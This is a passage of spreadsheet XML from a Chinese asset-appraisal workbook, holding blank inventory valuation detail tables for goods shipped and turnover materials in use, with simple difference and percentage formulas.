      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="381" t="n"/>
      <c r="E21" s="380" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555" t="n"/>
      <c r="L21" s="555">
        <f>K21-H21</f>
        <v/>
      </c>
      <c r="M21" s="555">
        <f>IF(H21=0,"",L21/H21*100)</f>
        <v/>
      </c>
      <c r="N21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="381" t="n"/>
      <c r="E22" s="380" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555" t="n"/>
      <c r="L22" s="555">
        <f>K22-H22</f>
        <v/>
      </c>
      <c r="M22" s="555">
        <f>IF(H22=0,"",L22/H22*100)</f>
        <v/>
      </c>
      <c r="N22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="381" t="n"/>
      <c r="E23" s="380" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555" t="n"/>
      <c r="L23" s="555">
        <f>K23-H23</f>
        <v/>
      </c>
      <c r="M23" s="555">
        <f>IF(H23=0,"",L23/H23*100)</f>
        <v/>
      </c>
      <c r="N23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="381" t="n"/>
      <c r="E24" s="380" t="n"/>
      <c r="F24" s="555" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555" t="n"/>
      <c r="L24" s="555">
        <f>K24-H24</f>
        <v/>
      </c>
      <c r="M24" s="555">
        <f>IF(H24=0,"",L24/H24*100)</f>
        <v/>
      </c>
      <c r="N24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="381" t="n"/>
      <c r="E25" s="380" t="n"/>
      <c r="F25" s="555" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555" t="n"/>
      <c r="L25" s="555">
        <f>K25-H25</f>
        <v/>
      </c>
      <c r="M25" s="555">
        <f>IF(H25=0,"",L25/H25*100)</f>
        <v/>
      </c>
      <c r="N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07" t="n"/>
      <c r="E26" s="380" t="n"/>
      <c r="F26" s="555">
        <f>ROUND(SUM(F7:F25),2)</f>
        <v/>
      </c>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="555">
        <f>ROUND(SUM(H7:H25),2)</f>
        <v/>
      </c>
      <c r="I26" s="555">
        <f>ROUND(SUM(I7:I25),2)</f>
        <v/>
      </c>
      <c r="J26" s="555" t="n"/>
      <c r="K26" s="555">
        <f>ROUND(SUM(K7:K25),2)</f>
        <v/>
      </c>
      <c r="L26" s="555">
        <f>K26-H26</f>
        <v/>
      </c>
      <c r="M26" s="555">
        <f>IF(H26=0,"",L26/H26*100)</f>
        <v/>
      </c>
      <c r="N26" s="383" t="n"/>
    </row>
    <row r="27" s="415">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B27" s="185" t="inlineStr">
        <is>
          <t>减：存货跌价准备</t>
        </is>
      </c>
      <c r="C27" s="567" t="n"/>
      <c r="D27" s="307" t="n"/>
      <c r="E27" s="380" t="n"/>
      <c r="F27" s="555" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="555" t="n"/>
      <c r="I27" s="555" t="n"/>
      <c r="J27" s="555" t="n"/>
      <c r="K27" s="555" t="n"/>
      <c r="L27" s="555">
        <f>K27-H27</f>
        <v/>
      </c>
      <c r="M27" s="555">
        <f>IF(H27=0,"",L27/H27*100)</f>
        <v/>
      </c>
      <c r="N27" s="383" t="n"/>
    </row>
    <row r="28" s="415">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B28" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C28" s="567" t="n"/>
      <c r="D28" s="307" t="n"/>
      <c r="E28" s="380" t="n"/>
      <c r="F28" s="555">
        <f>ROUND(F26-F27,2)</f>
        <v/>
      </c>
      <c r="G28" s="555" t="n"/>
      <c r="H28" s="555">
        <f>ROUND(H26-H27,2)</f>
        <v/>
      </c>
      <c r="I28" s="555">
        <f>ROUND(I26-I27,2)</f>
        <v/>
      </c>
      <c r="J28" s="555" t="n"/>
      <c r="K28" s="555">
        <f>ROUND(K26-K27,2)</f>
        <v/>
      </c>
      <c r="L28" s="555">
        <f>K28-H28</f>
        <v/>
      </c>
      <c r="M28" s="555">
        <f>IF(H28=0,"",L28/H28*100)</f>
        <v/>
      </c>
      <c r="N28" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="14">
    <mergeCell ref="E5:E6"/>
    <mergeCell ref="N5:N6"/>
    <mergeCell ref="F5:H5"/>
    <mergeCell ref="B1:N1"/>
    <mergeCell ref="I5:K5"/>
    <mergeCell ref="B28:C28"/>
    <mergeCell ref="M5:M6"/>
    <mergeCell ref="C5:C6"/>
    <mergeCell ref="B26:C26"/>
    <mergeCell ref="B27:C27"/>
    <mergeCell ref="D5:D6"/>
    <mergeCell ref="B2:N2"/>
    <mergeCell ref="B5:B6"/>
    <mergeCell ref="L5:L6"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:N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2" fitToHeight="0" blackAndWhite="1"/>
  <headerFooter scaleWithDoc="0">
    <oddHeader/>
    <oddFooter>&amp;L被评估单位填表人：张三_x000a_填表日期：2022年02月25日&amp;R评估人员：张三 李四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 codeName="Sheet34">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:N28"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="W33" sqref="W33"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="13" customWidth="1" style="410" min="1" max="1"/>
    <col width="14.8333333333333" customWidth="1" style="410" min="2" max="2"/>
    <col width="16.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="5.16666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="10.1666666666667" customWidth="1" style="582" min="6" max="6"/>
    <col width="8.83333333333333" customWidth="1" style="582" min="7" max="7"/>
    <col width="12.6666666666667" customWidth="1" style="582" min="8" max="8"/>
    <col outlineLevel="1" width="8.5" customWidth="1" style="582" min="9" max="9"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="582" min="10" max="10"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="582" min="11" max="12"/>
    <col outlineLevel="1" width="7.66666666666667" customWidth="1" style="582" min="13" max="13"/>
    <col width="8.16666666666667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存货—发出商品评估明细表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373" t="n"/>
      <c r="L3" s="373" t="n"/>
      <c r="M3" s="402" t="inlineStr">
        <is>
          <t>表3-9-7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583" t="n"/>
      <c r="G4" s="583" t="n"/>
      <c r="H4" s="583" t="n"/>
      <c r="I4" s="583" t="n"/>
      <c r="J4" s="583" t="n"/>
      <c r="K4" s="583" t="n"/>
      <c r="L4" s="583" t="n"/>
      <c r="M4" s="583" t="n"/>
      <c r="N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商品名称</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>对方单位名称</t>
        </is>
      </c>
      <c r="E5" s="272" t="inlineStr">
        <is>
          <t>计量
单位</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="G5" s="593" t="n"/>
      <c r="H5" s="567" t="n"/>
      <c r="I5" s="584" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="J5" s="593" t="n"/>
      <c r="K5" s="567" t="n"/>
      <c r="L5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="M5" s="584" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="N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380" t="inlineStr">
        <is>
          <t>数量</t>
        </is>
      </c>
      <c r="G6" s="380" t="inlineStr">
        <is>
          <t>单价</t>
        </is>
      </c>
      <c r="H6" s="380" t="inlineStr">
        <is>
          <t>金额</t>
        </is>
      </c>
      <c r="I6" s="584" t="inlineStr">
        <is>
          <t>实际数量</t>
        </is>
      </c>
      <c r="J6" s="380" t="inlineStr">
        <is>
          <t>单价</t>
        </is>
      </c>
      <c r="K6" s="584" t="inlineStr">
        <is>
          <t>金额</t>
        </is>
      </c>
      <c r="L6" s="594" t="n"/>
      <c r="M6" s="594" t="n"/>
      <c r="N6" s="594" t="n"/>
    </row>
    <row r="7" ht="16.5" customHeight="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="284" t="n"/>
      <c r="C7" s="198" t="n"/>
      <c r="D7" s="380" t="n"/>
      <c r="E7" s="313" t="n"/>
      <c r="F7" s="555" t="n"/>
      <c r="G7" s="555" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555" t="n"/>
      <c r="L7" s="555">
        <f>K7-H7</f>
        <v/>
      </c>
      <c r="M7" s="555">
        <f>IF(H7=0,"",L7/H7*100)</f>
        <v/>
      </c>
      <c r="N7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="380" t="n"/>
      <c r="E8" s="383" t="n"/>
      <c r="F8" s="555" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555" t="n"/>
      <c r="L8" s="555">
        <f>K8-H8</f>
        <v/>
      </c>
      <c r="M8" s="555">
        <f>IF(H8=0,"",L8/H8*100)</f>
        <v/>
      </c>
      <c r="N8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="380" t="n"/>
      <c r="E9" s="383" t="n"/>
      <c r="F9" s="555" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555" t="n"/>
      <c r="L9" s="555">
        <f>K9-H9</f>
        <v/>
      </c>
      <c r="M9" s="555">
        <f>IF(H9=0,"",L9/H9*100)</f>
        <v/>
      </c>
      <c r="N9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="380" t="n"/>
      <c r="E10" s="383" t="n"/>
      <c r="F10" s="555" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555" t="n"/>
      <c r="L10" s="555">
        <f>K10-H10</f>
        <v/>
      </c>
      <c r="M10" s="555">
        <f>IF(H10=0,"",L10/H10*100)</f>
        <v/>
      </c>
      <c r="N10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="380" t="n"/>
      <c r="E11" s="383" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555" t="n"/>
      <c r="L11" s="555">
        <f>K11-H11</f>
        <v/>
      </c>
      <c r="M11" s="555">
        <f>IF(H11=0,"",L11/H11*100)</f>
        <v/>
      </c>
      <c r="N11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="380" t="n"/>
      <c r="E12" s="383" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555" t="n"/>
      <c r="L12" s="555">
        <f>K12-H12</f>
        <v/>
      </c>
      <c r="M12" s="555">
        <f>IF(H12=0,"",L12/H12*100)</f>
        <v/>
      </c>
      <c r="N12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="380" t="n"/>
      <c r="E13" s="383" t="n"/>
      <c r="F13" s="555" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555" t="n"/>
      <c r="L13" s="555">
        <f>K13-H13</f>
        <v/>
      </c>
      <c r="M13" s="555">
        <f>IF(H13=0,"",L13/H13*100)</f>
        <v/>
      </c>
      <c r="N13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="380" t="n"/>
      <c r="E14" s="383" t="n"/>
      <c r="F14" s="555" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555" t="n"/>
      <c r="L14" s="555">
        <f>K14-H14</f>
        <v/>
      </c>
      <c r="M14" s="555">
        <f>IF(H14=0,"",L14/H14*100)</f>
        <v/>
      </c>
      <c r="N14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="380" t="n"/>
      <c r="E15" s="383" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555" t="n"/>
      <c r="L15" s="555">
        <f>K15-H15</f>
        <v/>
      </c>
      <c r="M15" s="555">
        <f>IF(H15=0,"",L15/H15*100)</f>
        <v/>
      </c>
      <c r="N15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="380" t="n"/>
      <c r="E16" s="383" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555" t="n"/>
      <c r="L16" s="555">
        <f>K16-H16</f>
        <v/>
      </c>
      <c r="M16" s="555">
        <f>IF(H16=0,"",L16/H16*100)</f>
        <v/>
      </c>
      <c r="N16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="380" t="n"/>
      <c r="E17" s="383" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555" t="n"/>
      <c r="L17" s="555">
        <f>K17-H17</f>
        <v/>
      </c>
      <c r="M17" s="555">
        <f>IF(H17=0,"",L17/H17*100)</f>
        <v/>
      </c>
      <c r="N17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="380" t="n"/>
      <c r="E18" s="383" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555" t="n"/>
      <c r="L18" s="555">
        <f>K18-H18</f>
        <v/>
      </c>
      <c r="M18" s="555">
        <f>IF(H18=0,"",L18/H18*100)</f>
        <v/>
      </c>
      <c r="N18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="380" t="n"/>
      <c r="E19" s="383" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555" t="n"/>
      <c r="L19" s="555">
        <f>K19-H19</f>
        <v/>
      </c>
      <c r="M19" s="555">
        <f>IF(H19=0,"",L19/H19*100)</f>
        <v/>
      </c>
      <c r="N19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="380" t="n"/>
      <c r="E20" s="383" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555" t="n"/>
      <c r="L20" s="555">
        <f>K20-H20</f>
        <v/>
      </c>
      <c r="M20" s="555">
        <f>IF(H20=0,"",L20/H20*100)</f>
        <v/>
      </c>
      <c r="N20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="380" t="n"/>
      <c r="E21" s="383" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555" t="n"/>
      <c r="L21" s="555">
        <f>K21-H21</f>
        <v/>
      </c>
      <c r="M21" s="555">
        <f>IF(H21=0,"",L21/H21*100)</f>
        <v/>
      </c>
      <c r="N21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="380" t="n"/>
      <c r="E22" s="383" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555" t="n"/>
      <c r="L22" s="555">
        <f>K22-H22</f>
        <v/>
      </c>
      <c r="M22" s="555">
        <f>IF(H22=0,"",L22/H22*100)</f>
        <v/>
      </c>
      <c r="N22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="380" t="n"/>
      <c r="E23" s="383" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555" t="n"/>
      <c r="L23" s="555">
        <f>K23-H23</f>
        <v/>
      </c>
      <c r="M23" s="555">
        <f>IF(H23=0,"",L23/H23*100)</f>
        <v/>
      </c>
      <c r="N23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="380" t="n"/>
      <c r="E24" s="383" t="n"/>
      <c r="F24" s="555" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555" t="n"/>
      <c r="L24" s="555">
        <f>K24-H24</f>
        <v/>
      </c>
      <c r="M24" s="555">
        <f>IF(H24=0,"",L24/H24*100)</f>
        <v/>
      </c>
      <c r="N24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="380" t="n"/>
      <c r="E25" s="383" t="n"/>
      <c r="F25" s="555" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555" t="n"/>
      <c r="L25" s="555">
        <f>K25-H25</f>
        <v/>
      </c>
      <c r="M25" s="555">
        <f>IF(H25=0,"",L25/H25*100)</f>
        <v/>
      </c>
      <c r="N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0" t="n"/>
      <c r="E26" s="383" t="n"/>
      <c r="F26" s="555">
        <f>ROUND(SUM(F7:F25),2)</f>
        <v/>
      </c>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="555">
        <f>ROUND(SUM(H7:H25),2)</f>
        <v/>
      </c>
      <c r="I26" s="555">
        <f>ROUND(SUM(I7:I25),2)</f>
        <v/>
      </c>
      <c r="J26" s="555" t="n"/>
      <c r="K26" s="555">
        <f>ROUND(SUM(K7:K25),2)</f>
        <v/>
      </c>
      <c r="L26" s="555">
        <f>K26-H26</f>
        <v/>
      </c>
      <c r="M26" s="555">
        <f>IF(H26=0,"",L26/H26*100)</f>
        <v/>
      </c>
      <c r="N26" s="383" t="n"/>
    </row>
    <row r="27" s="415">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B27" s="185" t="inlineStr">
        <is>
          <t>减：存货跌价准备</t>
        </is>
      </c>
      <c r="C27" s="567" t="n"/>
      <c r="D27" s="380" t="n"/>
      <c r="E27" s="383" t="n"/>
      <c r="F27" s="555" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="555" t="n"/>
      <c r="I27" s="555" t="n"/>
      <c r="J27" s="555" t="n"/>
      <c r="K27" s="555" t="n"/>
      <c r="L27" s="555">
        <f>K27-H27</f>
        <v/>
      </c>
      <c r="M27" s="555">
        <f>IF(H27=0,"",L27/H27*100)</f>
        <v/>
      </c>
      <c r="N27" s="383" t="n"/>
    </row>
    <row r="28" s="415">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B28" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C28" s="567" t="n"/>
      <c r="D28" s="380" t="n"/>
      <c r="E28" s="383" t="n"/>
      <c r="F28" s="555">
        <f>ROUND(F26-F27,2)</f>
        <v/>
      </c>
      <c r="G28" s="555" t="n"/>
      <c r="H28" s="555">
        <f>ROUND(H26-H27,2)</f>
        <v/>
      </c>
      <c r="I28" s="555">
        <f>ROUND(I26-I27,2)</f>
        <v/>
      </c>
      <c r="J28" s="555" t="n"/>
      <c r="K28" s="555">
        <f>ROUND(K26-K27,2)</f>
        <v/>
      </c>
      <c r="L28" s="555">
        <f>K28-H28</f>
        <v/>
      </c>
      <c r="M28" s="555">
        <f>IF(H28=0,"",L28/H28*100)</f>
        <v/>
      </c>
      <c r="N28" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="15">
    <mergeCell ref="E5:E6"/>
    <mergeCell ref="N5:N6"/>
    <mergeCell ref="F5:H5"/>
    <mergeCell ref="B1:N1"/>
    <mergeCell ref="I5:K5"/>
    <mergeCell ref="B28:C28"/>
    <mergeCell ref="M5:M6"/>
    <mergeCell ref="C5:C6"/>
    <mergeCell ref="M3:N3"/>
    <mergeCell ref="B26:C26"/>
    <mergeCell ref="B27:C27"/>
    <mergeCell ref="D5:D6"/>
    <mergeCell ref="B2:N2"/>
    <mergeCell ref="B5:B6"/>
    <mergeCell ref="L5:L6"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:N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8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 codeName="Sheet35">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:O28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12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="11.8333333333333" customWidth="1" style="410" min="2" max="2"/>
    <col width="19.8333333333333" customWidth="1" style="410" min="3" max="3"/>
    <col width="18.6666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col hidden="1" width="16.6666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="16.6666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="7" max="8"/>
    <col width="8.66666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="10" max="10"/>
    <col outlineLevel="1" width="9.66666666666667" customWidth="1" style="410" min="11" max="11"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="12" max="13"/>
    <col outlineLevel="1" width="7" customWidth="1" style="410" min="14" max="14"/>
    <col width="9.83333333333333" customWidth="1" style="410" min="15" max="15"/>
    <col width="9" customWidth="1" style="410" min="16" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="A1" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>存货—在用周转材料评估明细表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373" t="n"/>
      <c r="N3" s="373" t="n"/>
      <c r="O3" s="402" t="inlineStr">
        <is>
          <t>表3-9-8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185" t="inlineStr">
        <is>
          <t>名称</t>
        </is>
      </c>
      <c r="D5" s="185" t="inlineStr">
        <is>
          <t>规格型号</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>启用日期</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>原始入账价值</t>
        </is>
      </c>
      <c r="G5" s="380" t="inlineStr">
        <is>
          <t>账面价值（摊余价值）</t>
        </is>
      </c>
      <c r="H5" s="567" t="n"/>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>实际数量</t>
        </is>
      </c>
      <c r="J5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="K5" s="593" t="n"/>
      <c r="L5" s="567" t="n"/>
      <c r="M5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="N5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="O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380" t="inlineStr">
        <is>
          <t>数量</t>
        </is>
      </c>
      <c r="H6" s="380" t="inlineStr">
        <is>
          <t>金额</t>
        </is>
      </c>
      <c r="I6" s="594" t="n"/>
      <c r="J6" s="185" t="inlineStr">
        <is>
          <t>评估原值</t>
        </is>
      </c>
      <c r="K6" s="380" t="inlineStr">
        <is>
          <t>成新率%</t>
        </is>
      </c>
      <c r="L6" s="380" t="inlineStr">
        <is>
          <t>金额</t>
        </is>
      </c>
      <c r="M6" s="594" t="n"/>
      <c r="N6" s="594" t="n"/>
      <c r="O6" s="594" t="n"/>
    </row>
    <row r="7" ht="16.5" customHeight="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="381" t="n"/>
      <c r="E7" s="381" t="n"/>
      <c r="F7" s="555" t="n"/>
      <c r="G7" s="555" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555" t="n"/>
